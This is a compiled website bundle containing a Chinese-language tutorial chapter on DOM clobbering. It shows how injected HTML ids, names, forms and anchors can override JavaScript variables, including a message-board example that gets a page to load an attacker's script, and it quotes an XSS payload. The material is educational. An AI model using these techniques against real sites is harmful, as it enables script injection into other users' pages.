"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[614],{3905:(e,n,t)=>{t.d(n,{Zo:()=>c,kt:()=>u});var l=t(7294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function i(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);n&&(l=l.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,l)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?i(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):i(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function r(e,n){if(null==e)return{};var t,l,a=function(e,n){if(null==e)return{};var t,l,a={},i=Object.keys(e);for(l=0;l<i.length;l++)t=i[l],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(l=0;l<i.length;l++)t=i[l],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var p=l.createContext({}),m=function(e){var n=l.useContext(p),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},c=function(e){var n=m(e.components);return l.createElement(p.Provider,{value:n},e.children)},d="mdxType",s={inlineCode:"code",wrapper:function(e){var n=e.children;return l.createElement(l.Fragment,{},n)}},k=l.forwardRef((function(e,n){var t=e.components,a=e.mdxType,i=e.originalType,p=e.parentName,c=r(e,["components","mdxType","originalType","parentName"]),d=m(t),k=a,u=d["".concat(p,".").concat(k)]||d[k]||s[k]||i;return t?l.createElement(u,o(o({ref:n},c),{},{components:t})):l.createElement(u,o({ref:n},c))}));function u(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var i=t.length,o=new Array(i);o[0]=k;var r={};for(var p in n)hasOwnProperty.call(n,p)&&(r[p]=n[p]);r.originalType=e,r[d]="string"==typeof e?e:a,o[1]=r;for(var m=2;m<i;m++)o[m]=t[m];return l.createElement.apply(null,o)}return l.createElement.apply(null,t)}k.displayName="MDXCreateElement"},8983:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>p,contentTitle:()=>o,default:()=>s,frontMatter:()=>i,metadata:()=>r,toc:()=>m});var l=t(7462),a=(t(7294),t(3905));const i={sidebar_position:15},o="HTML \u4e5f\u53ef\u4ee5\u5f71\u97ff JavaScript\uff1fDOM clobbering \u4ecb\u7d39",r={unversionedId:"ch3/dom-clobbering",id:"ch3/dom-clobbering",title:"HTML \u4e5f\u53ef\u4ee5\u5f71\u97ff JavaScript\uff1fDOM clobbering \u4ecb\u7d39",description:"\u9664\u4e86\u900f\u904e\u50cf\u662f prototype pollution \u9019\u7a2e\u6f0f\u6d1e\u5f71\u97ff JavaScript \u7684\u57f7\u884c\u4ee5\u5916\uff0c\u4f60\u77e5\u9053\u5c31\u9023 HTML \u4e5f\u53ef\u4ee5\u5f71\u97ff JavaScript \u55ce\uff1f",source:"@site/docs/ch3/15-dom-clobbering.md",sourceDirName:"ch3",slug:"/ch3/dom-clobbering",permalink:"/beyond-xss/ch3/dom-clobbering",draft:!1,tags:[],version:"current",sidebarPosition:15,frontMatter:{sidebar_position:15},sidebar:"tutorialSidebar",previous:{title:"\u5229\u7528\u539f\u578b\u93c8\u7684\u653b\u64ca\u65b9\u5f0f\uff1aPrototype Pollution",permalink:"/beyond-xss/ch3/prototype-pollution"},next:{title:"\u524d\u7aef\u7684\u6a21\u677f\u6ce8\u5165\u653b\u64ca\uff1aCSTI",permalink:"/beyond-xss/ch3/csti"}},p={},m=[{value:"DOM \u8207 window \u7684\u91cf\u5b50\u7cfe\u7e8f",id:"dom-\u8207-window-\u7684\u91cf\u5b50\u7cfe\u7e8f",level:2},{value:"DOM clobbering \u5165\u9580",id:"dom-clobbering-\u5165\u9580",level:2},{value:"\u591a\u5c64\u7d1a\u7684 DOM Clobbering",id:"\u591a\u5c64\u7d1a\u7684-dom-clobbering",level:2},{value:"\u518d\u66f4\u591a\u5c64\u7d1a\u7684 DOM Clobbering",id:"\u518d\u66f4\u591a\u5c64\u7d1a\u7684-dom-clobbering",level:2},{value:"\u900f\u904e document \u64f4\u5c55\u653b\u64ca\u9762",id:"\u900f\u904e-document-\u64f4\u5c55\u653b\u64ca\u9762",level:2},{value:"\u5be6\u969b\u6848\u4f8b\u7814\u7a76\uff1aGmail AMP4Email XSS",id:"\u5be6\u969b\u6848\u4f8b\u7814\u7a76gmail-amp4email-xss",level:2},{value:"\u5c0f\u7d50",id:"\u5c0f\u7d50",level:2}],c={toc:m},d="wrapper";function s(e){let{components:n,...i}=e;return(0,a.kt)(d,(0,l.Z)({},c,i,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"html-\u4e5f\u53ef\u4ee5\u5f71\u97ff-javascriptdom-clobbering-\u4ecb\u7d39"},"HTML \u4e5f\u53ef\u4ee5\u5f71\u97ff JavaScript\uff1fDOM clobbering \u4ecb\u7d39"),(0,a.kt)("p",null,"\u9664\u4e86\u900f\u904e\u50cf\u662f prototype pollution \u9019\u7a2e\u6f0f\u6d1e\u5f71\u97ff JavaScript \u7684\u57f7\u884c\u4ee5\u5916\uff0c\u4f60\u77e5\u9053\u5c31\u9023 HTML \u4e5f\u53ef\u4ee5\u5f71\u97ff JavaScript \u55ce\uff1f"),(0,a.kt)("p",null,"\u6211\u5011\u90fd\u77e5\u9053 JavaScript \u662f\u4e00\u5b9a\u53ef\u4ee5\u5f71\u97ff\u5230 HTML \u7684\uff0c\u53ef\u4ee5\u900f\u904e DOM API \u5c0d HTML \u505a\u4efb\u4f55\u7684\u64cd\u4f5c\uff0c\u4f46\u662f HTML \u8a72\u600e\u9ebc\u5f71\u97ff\u5230 JavaScript \u7684\u57f7\u884c\u5462\uff1f\u9019\u5c31\u662f\u6709\u8da3\u7684\u5730\u65b9\u4e86\u3002"),(0,a.kt)("p",null,"\u5728\u6b63\u5f0f\u958b\u59cb\u4e4b\u524d\uff0c\u5148\u7d66\u5927\u5bb6\u4e00\u500b\u8da3\u5473\u984c\u76ee\u5c0f\u8a66\u8eab\u624b\u3002"),(0,a.kt)("p",null,"\u5047\u8a2d\u4f60\u6709\u4e00\u6bb5\u7a0b\u5f0f\u78bc\uff0c\u6709\u4e00\u500b\u6309\u9215\u4ee5\u53ca\u4e00\u6bb5 script\uff0c\u5982\u4e0b\u6240\u793a\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<head>\n  <meta charset="utf-8">\n  <meta name="viewport" content="width=device-width, initial-scale=1">\n</head>\n\n<body>\n  <button id="btn">click me</button>\n  <script>\n    // TODO: add click event listener to button\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u73fe\u5728\u8acb\u4f60\u5617\u8a66\u7528\u300c\u6700\u77ed\u7684\u7a0b\u5f0f\u78bc\u300d\uff0c\u5728 ",(0,a.kt)("inlineCode",{parentName:"p"},"<script>")," \u6a19\u7c64\u5167\u5be6\u4f5c\u51fa\u300c\u9ede\u4e0b\u6309\u9215\u6642\u6703\u57f7\u884c ",(0,a.kt)("inlineCode",{parentName:"p"},"alert(1)"),"\u300d\u9019\u500b\u529f\u80fd\u3002"),(0,a.kt)("p",null,"\u8209\u4f8b\u4f86\u8aaa\uff0c\u9019\u6a23\u5beb\u53ef\u4ee5\u9054\u6210\u76ee\u6a19\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js"},"document.getElementById('btn')\n  .addEventListener('click', () => {\n    alert(1)\n  })\n")),(0,a.kt)("p",null,"\u90a3\u5982\u679c\u8981\u8b93\u7a0b\u5f0f\u78bc\u6700\u77ed\uff0c\u4f60\u7684\u7b54\u6848\u6703\u662f\u4ec0\u9ebc\uff1f"),(0,a.kt)("p",null,"\u5927\u5bb6\u53ef\u4ee5\u5728\u5f80\u4e0b\u770b\u4ee5\u524d\u5148\u60f3\u4e00\u4e0b\u9019\u500b\u554f\u984c\uff0c\u60f3\u597d\u4ee5\u5f8c\u5c31\u8b93\u6211\u5011\u6b63\u5f0f\u958b\u59cb\u5427\uff01"),(0,a.kt)("p",null,"\u9632\u96f7\n.",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".",(0,a.kt)("br",{parentName:"p"}),"\n",".  "),(0,a.kt)("h2",{id:"dom-\u8207-window-\u7684\u91cf\u5b50\u7cfe\u7e8f"},"DOM \u8207 window \u7684\u91cf\u5b50\u7cfe\u7e8f"),(0,a.kt)("p",null,"\u4f60\u77e5\u9053 DOM \u88e1\u9762\u7684\u6771\u897f\uff0c\u6709\u53ef\u80fd\u5f71\u97ff\u5230 ",(0,a.kt)("inlineCode",{parentName:"p"},"window")," \u55ce\uff1f"),(0,a.kt)("p",null,"\u9019\u500b\u884c\u70ba\u662f\u6211\u5e7e\u5e74\u524d\u5728\u81c9\u66f8\u7684\u524d\u7aef\u793e\u7fa4\u7121\u610f\u9593\u5f97\u77e5\u7684\uff0c\u90a3\u5c31\u662f\u4f60\u5728 HTML \u88e1\u9762\u8a2d\u5b9a\u4e00\u500b\u6709 id \u7684\u5143\u7d20\u4e4b\u5f8c\uff0c\u5728 JavaScript \u88e1\u9762\u5c31\u53ef\u4ee5\u76f4\u63a5\u5b58\u53d6\u5230\u5b83\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<button id="btn">click me</button>\n<script>\n  console.log(window.btn) // <button id="btn">click me</button>\n<\/script>\n')),(0,a.kt)("p",null,"\u7136\u5f8c\u56e0\u70ba scope \u7684\u7de3\u6545\uff0c\u4f60\u76f4\u63a5\u7528 ",(0,a.kt)("inlineCode",{parentName:"p"},"btn")," \u4e5f\u53ef\u4ee5\uff0c\u56e0\u70ba\u7576\u524d\u7684 scope \u627e\u4e0d\u5230\u5c31\u6703\u5f80\u4e0a\u627e\uff0c\u4e00\u8def\u627e\u5230 ",(0,a.kt)("inlineCode",{parentName:"p"},"window"),"\u3002"),(0,a.kt)("p",null,"\u6240\u4ee5\u958b\u982d\u90a3\u984c\uff0c\u7b54\u6848\u662f\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js"},"btn.onclick=()=>alert(1)\n")),(0,a.kt)("p",null,"\u4e0d\u9700\u8981 ",(0,a.kt)("inlineCode",{parentName:"p"},"getElementById"),"\uff0c\u4e5f\u4e0d\u9700\u8981 ",(0,a.kt)("inlineCode",{parentName:"p"},"querySelector"),"\uff0c\u53ea\u8981\u76f4\u63a5\u7528\u8ddf id \u540c\u540d\u7684\u8b8a\u6578\u53bb\u62ff\uff0c\u5c31\u53ef\u4ee5\u62ff\u5f97\u5230\u3002"),(0,a.kt)("p",null,"\u800c\u9019\u500b\u884c\u70ba\u662f\u6709\u660e\u78ba\u5b9a\u7fa9\u5728 spec \u4e0a\u7684\uff0c\u5728 ",(0,a.kt)("a",{parentName:"p",href:"https://html.spec.whatwg.org/multipage/window-object.html#named-access-on-the-window-object"},"7.3.3 Named access on the Window object"),"\uff1a"),(0,a.kt)("p",null,(0,a.kt)("img",{src:t(3728).Z,width:"1408",height:"298"})),(0,a.kt)("p",null,"\u5e6b\u5927\u5bb6\u7bc0\u9304\u5169\u500b\u91cd\u9ede\uff1a"),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"the value of the name content attribute for all ",(0,a.kt)("inlineCode",{parentName:"li"},"embed"),", ",(0,a.kt)("inlineCode",{parentName:"li"},"form"),", ",(0,a.kt)("inlineCode",{parentName:"li"},"img"),", and ",(0,a.kt)("inlineCode",{parentName:"li"},"object")," elements that have a non-empty name content attribute"),(0,a.kt)("li",{parentName:"ol"},"the value of the ",(0,a.kt)("inlineCode",{parentName:"li"},"id")," content attribute for all HTML elements that have a non-empty id content attribute")),(0,a.kt)("p",null,"\u4e5f\u5c31\u662f\u8aaa\u9664\u4e86 id \u53ef\u4ee5\u76f4\u63a5\u7528 ",(0,a.kt)("inlineCode",{parentName:"p"},"window")," \u5b58\u53d6\u5230\u4ee5\u5916\uff0c",(0,a.kt)("inlineCode",{parentName:"p"},"<embed>"),", ",(0,a.kt)("inlineCode",{parentName:"p"},"<form>"),", ",(0,a.kt)("inlineCode",{parentName:"p"},"<img>")," \u8ddf ",(0,a.kt)("inlineCode",{parentName:"p"},"<object>")," \u9019\u56db\u500b\u6a19\u7c64\u7528 name \u4e5f\u53ef\u4ee5\u5b58\u53d6\u5230\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<embed name="a"></embed>\n<form name="b"></form>\n<img name="c" />\n<object name="d"></object>\n')),(0,a.kt)("p",null,"\u7406\u89e3\u9019\u500b\u898f\u683c\u4e4b\u5f8c\uff0c\u53ef\u4ee5\u5f97\u51fa\u4e00\u500b\u7d50\u8ad6\uff1a"),(0,a.kt)("blockquote",null,(0,a.kt)("p",{parentName:"blockquote"},"\u6211\u5011\u662f\u53ef\u4ee5\u900f\u904e HTML \u5143\u7d20\u4f86\u5f71\u97ff JavaScript \u7684")),(0,a.kt)("p",null,"\u800c\u9019\u500b\u624b\u6cd5\u7528\u5728\u653b\u64ca\u4e0a\uff0c\u5c31\u662f\u6a19\u984c\u7684 DOM clobbering\u3002\u4e4b\u524d\u662f\u56e0\u70ba\u9019\u500b\u653b\u64ca\u624d\u7b2c\u4e00\u6b21\u807d\u5230 clobbering \u9019\u500b\u55ae\u5b57\u7684\uff0c\u53bb\u67e5\u4e00\u4e0b\u767c\u73fe\u5728 CS \u9818\u57df\u4e2d\u6709\u8986\u84cb\u7684\u610f\u601d\uff0c\u5c31\u662f\u900f\u904e DOM \u628a\u4e00\u4e9b\u6771\u897f\u8986\u84cb\u6389\u4ee5\u9054\u6210\u653b\u64ca\u7684\u624b\u6bb5\u3002"),(0,a.kt)("h2",{id:"dom-clobbering-\u5165\u9580"},"DOM clobbering \u5165\u9580"),(0,a.kt)("p",null,"\u90a3\u5728\u4ec0\u9ebc\u5834\u666f\u4e4b\u4e0b\u6709\u6a5f\u6703\u7528 DOM clobbering \u653b\u64ca\u5462\uff1f"),(0,a.kt)("p",null,"\u9996\u5148\uff0c\u5fc5\u9808\u6709\u6a5f\u6703\u5728\u9801\u9762\u4e0a\u986f\u793a\u4f60\u81ea\u8a02\u7684 HTML\uff0c\u5426\u5247\u5c31\u6c92\u6709\u8fa6\u6cd5\u4e86\u3002"),(0,a.kt)("p",null,"\u6240\u4ee5\u4e00\u500b\u53ef\u4ee5\u653b\u64ca\u7684\u5834\u666f\u53ef\u80fd\u6703\u50cf\u662f\u9019\u6a23\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},"<!DOCTYPE html>\n<html>\n<body>\n  <h1>\u7559\u8a00\u677f</h1>\n  <div>\n    \u4f60\u7684\u7559\u8a00\uff1a\u54c8\u56c9\u5927\u5bb6\u597d\n  </div> \n  <script>\n    if (window.TEST_MODE) {\n      // load test script\n      var script = document.createElement('script')\n      script.src = window.TEST_SCRIPT_SRC\n      document.body.appendChild(script)\n    }\n  <\/script>\n</body>\n</html>\n")),(0,a.kt)("p",null,"\u5047\u8a2d\u73fe\u5728\u6709\u4e00\u500b\u7559\u8a00\u677f\uff0c\u4f60\u53ef\u4ee5\u8f38\u5165\u4efb\u610f\u5167\u5bb9\uff0c\u4f46\u662f\u4f60\u7684\u8f38\u5165\u5728 server \u7aef\u6703\u7d93\u904e sanitize\uff0c\u628a\u4efb\u4f55\u53ef\u4ee5\u57f7\u884c JavaScript \u7684\u6771\u897f\u7d66\u62ff\u6389\uff0c\u6240\u4ee5 ",(0,a.kt)("inlineCode",{parentName:"p"},"<script><\/script>")," \u6703\u88ab\u522a\u6389\uff0c",(0,a.kt)("inlineCode",{parentName:"p"},"<img src=x onerror=alert(1)>")," \u7684 ",(0,a.kt)("inlineCode",{parentName:"p"},"onerror")," \u6703\u88ab\u62ff\u6389\uff0c\u9084\u6709\u8a31\u591a XSS payload \u90fd\u6c92\u6709\u8fa6\u6cd5\u904e\u95dc\u3002"),(0,a.kt)("p",null,"\u7c21\u800c\u8a00\u4e4b\uff0c\u4f60\u6c92\u8fa6\u6cd5\u57f7\u884c JavaScript \u4f86\u9054\u6210 XSS\uff0c\u56e0\u70ba\u9019\u4e9b\u90fd\u88ab\u904e\u6ffe\u6389\u4e86\u3002"),(0,a.kt)("p",null,"\u4f46\u662f\u56e0\u70ba\u7a2e\u7a2e\u56e0\u7d20\uff0c\u4e26\u4e0d\u6703\u904e\u6ffe\u6389 HTML \u6a19\u7c64\uff0c\u6240\u4ee5\u4f60\u53ef\u4ee5\u505a\u7684\u4e8b\u60c5\u662f\u986f\u793a\u81ea\u8a02\u7684 HTML\u3002\u53ea\u8981\u6c92\u6709\u57f7\u884c JavaScript\uff0c\u60f3\u8981\u63d2\u5165\u4ec0\u9ebc HTML \u6a19\u7c64\uff0c\u8a2d\u7f6e\u4ec0\u9ebc\u5c6c\u6027\u90fd\u53ef\u4ee5\u3002"),(0,a.kt)("p",null,"\u6240\u4ee5\u5462\uff0c\u53ef\u4ee5\u9019\u6a23\u505a\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <h1>\u7559\u8a00\u677f</h1>\n  <div>\n    \u4f60\u7684\u7559\u8a00\uff1a<div id="TEST_MODE"></div>\n    <a id="TEST_SCRIPT_SRC" href="my_evil_script"></a>\n  </div> \n  <script>\n    if (window.TEST_MODE) {\n      // load test script\n      var script = document.createElement(\'script\')\n      script.src = window.TEST_SCRIPT_SRC\n      document.body.appendChild(script)\n    }\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u6839\u64da\u6211\u5011\u4e0a\u9762\u6240\u5f97\u5230\u7684\u77e5\u8b58\uff0c\u53ef\u4ee5\u63d2\u5165\u4e00\u500b id \u662f TEST_MODE \u7684\u6a19\u7c64 ",(0,a.kt)("inlineCode",{parentName:"p"},'<div id="TEST_MODE"></div>'),"\uff0c\u9019\u6a23\u5e95\u4e0b JavaScript \u7684 ",(0,a.kt)("inlineCode",{parentName:"p"},"if (window.TEST_MODE)")," \u5c31\u6703\u904e\u95dc\uff0c\u56e0\u70ba ",(0,a.kt)("inlineCode",{parentName:"p"},"window.TEST_MODE")," \u6703\u662f\u9019\u500b div \u5143\u7d20\u3002"),(0,a.kt)("p",null,"\u518d\u4f86\u6211\u5011\u53ef\u4ee5\u7528 ",(0,a.kt)("inlineCode",{parentName:"p"},'<a id="TEST_SCRIPT_SRC" href="my_evil_script"></a>'),"\uff0c\u4f86\u8b93 ",(0,a.kt)("inlineCode",{parentName:"p"},"window.TEST_SCRIPT_SRC")," \u8f49\u6210\u5b57\u4e32\u4e4b\u5f8c\u8b8a\u6210\u6211\u5011\u60f3\u8981\u7684\u5b57\u3002"),(0,a.kt)("p",null,"\u5728\u5927\u591a\u6578\u7684\u72c0\u6cc1\u4e2d\uff0c\u53ea\u662f\u628a\u4e00\u500b\u8b8a\u6578\u8986\u84cb\u6210 HTML \u5143\u7d20\u662f\u4e0d\u5920\u7684\uff0c\u4f8b\u5982\u8aaa\u4f60\u628a\u4e0a\u9762\u90a3\u6bb5\u7a0b\u5f0f\u78bc\u7576\u4e2d\u7684 ",(0,a.kt)("inlineCode",{parentName:"p"},"window.TEST_MODE")," \u8f49\u6210\u5b57\u4e32\u5370\u51fa\u4f86\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js"},"// <div id=\"TEST_MODE\" />\nconsole.log(window.TEST_MODE + '')\n")),(0,a.kt)("p",null,"\u7d50\u679c\u6703\u662f\uff1a",(0,a.kt)("inlineCode",{parentName:"p"},"[object HTMLDivElement]"),"\u3002"),(0,a.kt)("p",null,"\u628a\u4e00\u500b HTML \u5143\u7d20\u8f49\u6210\u5b57\u4e32\u5c31\u662f\u9019\u6a23\uff0c\u6703\u8b8a\u6210\u9019\u7a2e\u5f62\u5f0f\uff0c\u5982\u679c\u662f\u9019\u6a23\u7684\u8a71\u90a3\u57fa\u672c\u4e0a\u6c92\u8fa6\u6cd5\u5229\u7528\u3002\u4f46\u5e78\u597d HTML \u88e1\u9762\u6709\u5169\u500b\u5143\u7d20\u5728 toString \u7684\u6642\u5019\u6703\u505a\u7279\u6b8a\u8655\u7406\uff0c",(0,a.kt)("inlineCode",{parentName:"p"},"<base>")," \u8ddf ",(0,a.kt)("inlineCode",{parentName:"p"},"<a>"),"\uff1a"),(0,a.kt)("p",null,(0,a.kt)("img",{src:t(9274).Z,width:"799",height:"665"})),(0,a.kt)("p",null,"\u4f86\u6e90\uff1a",(0,a.kt)("a",{parentName:"p",href:"https://html.spec.whatwg.org/#api-for-a-and-area-elements"},"4.6.3 API for a and area elements")),(0,a.kt)("p",null,"\u9019\u5169\u500b\u5143\u7d20\u5728 ",(0,a.kt)("inlineCode",{parentName:"p"},"toString")," \u7684\u6642\u5019\u6703\u56de\u50b3 URL\uff0c\u800c\u6211\u5011\u53ef\u4ee5\u900f\u904e href \u5c6c\u6027\u4f86\u8a2d\u7f6e URL\uff0c\u5c31\u53ef\u4ee5\u8b93 ",(0,a.kt)("inlineCode",{parentName:"p"},"toString")," \u4e4b\u5f8c\u7684\u5167\u5bb9\u53ef\u63a7\u3002"),(0,a.kt)("p",null,"\u6240\u4ee5\u7d9c\u5408\u4ee5\u4e0a\u624b\u6cd5\uff0c\u6211\u5011\u5b78\u5230\u4e86\uff1a"),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"\u7528 HTML \u642d\u914d id \u5c6c\u6027\u5f71\u97ff JavaScript \u8b8a\u6578"),(0,a.kt)("li",{parentName:"ol"},"\u7528 ",(0,a.kt)("inlineCode",{parentName:"li"},"<a>")," \u642d\u914d href \u4ee5\u53ca id \u8b93\u5143\u7d20 ",(0,a.kt)("inlineCode",{parentName:"li"},"toString")," \u4e4b\u5f8c\u8b8a\u6210\u6211\u5011\u60f3\u8981\u7684\u503c")),(0,a.kt)("p",null,"\u900f\u904e\u4e0a\u9762\u9019\u5169\u500b\u624b\u6cd5\u518d\u642d\u914d\u9069\u5408\u7684\u60c5\u5883\uff0c\u5c31\u6709\u6a5f\u6703\u5229\u7528 DOM clobbering \u4f86\u505a\u653b\u64ca\u3002"),(0,a.kt)("p",null,"\u4e0d\u904e\u9019\u908a\u8981\u63d0\u9192\u5927\u5bb6\u4e00\u4ef6\u4e8b\uff0c\u5982\u679c\u4f60\u60f3\u653b\u64ca\u7684\u8b8a\u6578\u5df2\u7d93\u5b58\u5728\u7684\u8a71\uff0c\u7528 DOM \u662f\u8986\u84cb\u4e0d\u6389\u7684\uff0c\u4f8b\u5982\u8aaa\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<head>\n  <script>\n    TEST_MODE = 1\n  <\/script>\n</head>\n<body>\n  <div id="TEST_MODE"></div> \n  <script>\n    console.log(window.TEST_MODE) // 1\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("h2",{id:"\u591a\u5c64\u7d1a\u7684-dom-clobbering"},"\u591a\u5c64\u7d1a\u7684 DOM Clobbering"),(0,a.kt)("p",null,"\u5728\u524d\u9762\u7684\u7bc4\u4f8b\u4e2d\uff0c\u6211\u5011\u7528 DOM \u628a ",(0,a.kt)("inlineCode",{parentName:"p"},"window.TEST_MODE")," \u84cb\u6389\uff0c\u5275\u9020\u51fa\u672a\u9810\u671f\u7684\u884c\u70ba\u3002\u90a3\u5982\u679c\u8981\u84cb\u6389\u7684\u5c0d\u8c61\u662f\u500b\u7269\u4ef6\uff0c\u6709\u6a5f\u6703\u55ce\uff1f"),(0,a.kt)("p",null,"\u4f8b\u5982\u8aaa ",(0,a.kt)("inlineCode",{parentName:"p"},"window.config.isTest"),"\uff0c\u9019\u6a23\u4e5f\u53ef\u4ee5\u7528 DOM clobbering \u84cb\u6389\u55ce\uff1f"),(0,a.kt)("p",null,"\u6709\u5e7e\u7a2e\u65b9\u6cd5\u53ef\u4ee5\u84cb\u6389\uff0c\u7b2c\u4e00\u7a2e\u662f\u5229\u7528 HTML \u6a19\u7c64\u7684\u5c64\u7d1a\u95dc\u4fc2\uff0c\u5177\u6709\u9019\u6a23\u7279\u6027\u7684\u662f form\uff0c\u8868\u55ae\u9019\u500b\u5143\u7d20\uff1a"),(0,a.kt)("p",null,"\u5728 HTML \u7684 ",(0,a.kt)("a",{parentName:"p",href:"https://www.w3.org/TR/html52/sec-forms.html"},"spec")," \u4e2d\u6709\u9019\u6a23\u4e00\u6bb5\uff1a"),(0,a.kt)("p",null,(0,a.kt)("img",{src:t(6373).Z,width:"858",height:"275"})),(0,a.kt)("p",null,"\u53ef\u4ee5\u5229\u7528 ",(0,a.kt)("inlineCode",{parentName:"p"},"form[name]")," \u6216\u662f ",(0,a.kt)("inlineCode",{parentName:"p"},"form[id]")," \u53bb\u62ff\u5b83\u5e95\u4e0b\u7684\u5143\u7d20\uff0c\u4f8b\u5982\u8aaa\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <form id="config">\n    <input name="isTest" />\n    <button id="isProd"></button>\n  </form>\n  <script>\n    console.log(config) // <form id="config">\n    console.log(config.isTest) // <input name="isTest" />\n    console.log(config.isProd) // <button id="isProd"></button>\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u5982\u6b64\u4e00\u4f86\u5c31\u53ef\u4ee5\u69cb\u9020\u51fa\u5169\u5c64\u7684 DOM clobbering\u3002\u4e0d\u904e\u6709\u4e00\u9ede\u8981\u6ce8\u610f\uff0c\u90a3\u5c31\u662f\u9019\u908a\u6c92\u6709 ",(0,a.kt)("inlineCode",{parentName:"p"},"<a>")," \u53ef\u4ee5\u7528\uff0c\u6240\u4ee5 ",(0,a.kt)("inlineCode",{parentName:"p"},"toString")," \u4e4b\u5f8c\u90fd\u6703\u8b8a\u6210\u6c92\u8fa6\u6cd5\u5229\u7528\u7684\u5f62\u5f0f\u3002"),(0,a.kt)("p",null,"\u9019\u908a\u6bd4\u8f03\u6709\u53ef\u80fd\u5229\u7528\u7684\u6a5f\u6703\u662f\uff0c\u7576\u4f60\u8981\u8986\u84cb\u7684\u6771\u897f\u662f\u7528 ",(0,a.kt)("inlineCode",{parentName:"p"},"value")," \u5b58\u53d6\u7684\u6642\u5019\uff0c\u4f8b\u5982\u8aaa\uff1a",(0,a.kt)("inlineCode",{parentName:"p"},"config.enviroment.value"),"\uff0c\u5c31\u53ef\u4ee5\u5229\u7528 ",(0,a.kt)("inlineCode",{parentName:"p"},"<input>")," \u7684 value \u5c6c\u6027\u505a\u8986\u84cb\uff1a"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <form id="config">\n    <input name="enviroment" value="test" />\n  </form>\n  <script>\n    console.log(config.enviroment.value) // test\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u7c21\u55ae\u4f86\u8aaa\u5462\uff0c\u5c31\u662f\u53ea\u6709\u90a3\u4e9b\u5167\u5efa\u7684\u5c6c\u6027\u53ef\u4ee5\u8986\u84cb\uff0c\u5176\u4ed6\u662f\u6c92\u6709\u8fa6\u6cd5\u7684\u3002"),(0,a.kt)("p",null,"\u9664\u4e86\u5229\u7528 HTML \u672c\u8eab\u7684\u5c64\u7d1a\u4ee5\u5916\uff0c\u9084\u53ef\u4ee5\u5229\u7528\u53e6\u5916\u4e00\u500b\u7279\u6027\uff1a",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection"),"\u3002"),(0,a.kt)("p",null,"\u5728\u6211\u5011\u7a0d\u65e9\u770b\u5230\u7684\u95dc\u65bc ",(0,a.kt)("inlineCode",{parentName:"p"},"Named access on the Window object")," \u7684 spec \u7576\u4e2d\uff0c\u6c7a\u5b9a\u503c\u662f\u4ec0\u9ebc\u7684\u6bb5\u843d\u662f\u9019\u6a23\u5beb\u7684\uff1a"),(0,a.kt)("p",null,(0,a.kt)("img",{src:t(7331).Z,width:"1457",height:"420"})),(0,a.kt)("p",null,"\u5982\u679c\u8981\u56de\u50b3\u7684\u6771\u897f\u6709\u591a\u500b\uff0c\u5c31\u56de\u50b3 ",(0,a.kt)("inlineCode",{parentName:"p"},"HTMLCollection"),"\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<html>\n<body>\n  <a id="config"></a>\n  <a id="config"></a>\n  <script>\n    console.log(config) // HTMLCollection(2)\n  <\/script>\n</body>\n</html>\n')),(0,a.kt)("p",null,"\u90a3\u6709\u4e86 